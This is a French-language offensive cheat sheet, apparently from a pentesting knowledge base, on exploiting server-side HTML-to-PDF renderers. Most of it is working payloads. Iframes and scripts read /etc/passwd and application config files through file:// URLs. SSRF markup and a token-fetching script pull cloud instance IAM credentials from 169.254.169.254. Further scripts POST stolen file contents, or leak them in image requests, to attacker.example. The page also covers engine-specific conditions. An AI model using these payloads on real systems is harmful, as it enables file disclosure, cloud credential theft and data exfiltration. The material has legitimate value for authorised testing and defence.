---
title: "Abus des moteurs de rendu HTML-vers-PDF"
description: "Du HTML et du JavaScript injectés dans des moteurs de rendu PDF côté serveur lisent des fichiers locaux via file://, atteignent des endpoints internes et de métadonnées cloud par SSRF, et exfiltrent les résultats."
keywords:
  - html vers pdf
  - wkhtmltopdf
  - headless chrome
  - puppeteer
  - ssrf
  - lecture de fichier
---

# PDF

De nombreuses applications génèrent des PDF en rendant un modèle HTML avec un moteur de niveau navigateur : wkhtmltopdf, Chrome headless ou Puppeteer. Lorsque l'entrée utilisateur est placée dans ce HTML sans encodage, le moteur exécute le balisage et le script de l'attaquant avec la position réseau du serveur, offrant la lecture de fichiers locaux, la falsification de requêtes côté serveur et l'exfiltration.

## Le sink

Un champ est concaténé dans le modèle que le moteur de rendu charge :

```html
<h1>Report for USERNAME_HERE</h1>
```

Injectez du HTML pour confirmer le rendu, puis escaladez vers du script :

```html
<img src=x onerror="document.title='xss'">
<iframe src="file:///etc/passwd"></iframe>
```

## Lecture de fichiers locaux

Le moteur de rendu s'exécute avec un accès au système de fichiers, donc les URL `file://` tirent des fichiers locaux dans le PDF généré. Une iframe ou un object affiche le contenu directement :

```html
<iframe width="1000" height="1000" src="file:///etc/passwd"></iframe>
<object data="file:///var/www/app/config.php" width="1000" height="1000"></object>
```

Dans les moteurs capables d'exécuter du script, lisez le fichier et placez son texte là où il est rendu :

```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => { document.body.innerText = t; });
</script>
```

Ces lectures `file://` ne fonctionnent que lorsque le moteur de rendu autorise l'accès aux fichiers locaux. wkhtmltopdf 0.12.6 active `--disable-local-file-access` par défaut, donc ce payload se déclenche contre une version plus ancienne ou une configuration l'ayant réactivé avec `--enable-local-file-access` ; Chrome headless et Puppeteer verrouillent de même `file://` derrière des flags. Les chemins SSRF ci-dessous ne requièrent aucun accès aux fichiers locaux et fonctionnent contre les moteurs de rendu par défaut.

## SSRF vers les endpoints internes et de métadonnées

Comme le fetch provient du serveur, le balisage injecté atteint des hôtes que l'attaquant ne peut pas toucher directement. Tirez une page d'administration interne ou un endpoint de métadonnées cloud dans le PDF :

```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="http://localhost:8080/admin/">
```

Sur les instances cloud, le service de métadonnées livre les identifiants de l'instance. Là où l'instance expose encore IMDSv1, aucun token n'est nécessaire et une `<iframe>` rend les métadonnées directement dans le PDF sans aucune lecture cross-origin, ce qui fonctionne donc dans un moteur de rendu par défaut. Il s'agit d'une lecture en deux étapes : `/security-credentials/` ne renvoie que le nom du rôle attaché, et le JSON des identifiants se trouve un niveau plus bas à `/security-credentials/<role-name>`. Rendez le premier pour apprendre le rôle, puis le second pour les clés :

```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<iframe width="1000" height="1000"
  src="http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"></iframe>
```

IMDSv2 requiert un `PUT` pour obtenir un token et un en-tête de requête personnalisé, que seul un script peut envoyer. Ce chemin par script ne fonctionne que dans un moteur de rendu dont la sécurité web est désactivée (`--disable-web-security`) ou dans une version qui n'applique pas CORS : les requêtes sont cross-origin vers `169.254.169.254`, le service de métadonnées ne renvoie aucun en-tête CORS, et l'en-tête de token personnalisé force un preflight auquel il ne répond jamais, de sorte que `r.text()` ne peut pas lire le token ni l'identifiant dans un pipeline Chrome headless par défaut. Sous cette condition non par défaut :

```html
<script>
fetch('http://169.254.169.254/latest/api/token',
  {method:'PUT', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'60'}})
 .then(r => r.text())
 .then(tok => fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/role',
   {headers:{'X-aws-ec2-metadata-token':tok}}))
 .then(r => r.text())
 .then(d => { document.title = d; });
</script>
```

## Exfiltration

Rendre les données volées dans le PDF fonctionne lorsque vous recevez le fichier, mais les contextes aveugles ont besoin d'un canal hors bande. Faites lire par le script injecté une ressource locale ou interne et faites-la POSTer vers votre serveur :

```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => fetch('http://attacker.example/x', {method:'POST', body:t}));
</script>
```

Une image ou une balise XHR fonctionne là où `fetch` est bloqué :

```html
<script>
var x = new XMLHttpRequest();
x.open('GET','file:///etc/hostname',false); x.send();
new Image().src='http://attacker.example/?d='+encodeURIComponent(x.responseText);
</script>
```

## Notes sur les moteurs

- **wkhtmltopdf** : fort support de lecture `file://` et HTTP, JS limité ; préférez `<iframe>`/`<object>` et les balises `<img>`.
- **Chrome headless / Puppeteer** : JavaScript complet, donc `fetch`, `XMLHttpRequest` et l'exfiltration dynamique s'exécutent tous ; surveillez `--disable-web-security` ou l'absence de restrictions `file://`.
- La livraison se fait via n'importe quel champ qui atterrit dans le modèle, se déclenchant côté serveur lorsque le PDF est généré.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Collaborator pour injecter du balisage et capturer les callbacks SSRF ou d'exfiltration.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** : capture hors bande des callbacks côté moteur de rendu.

## Références

- [OWASP: Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
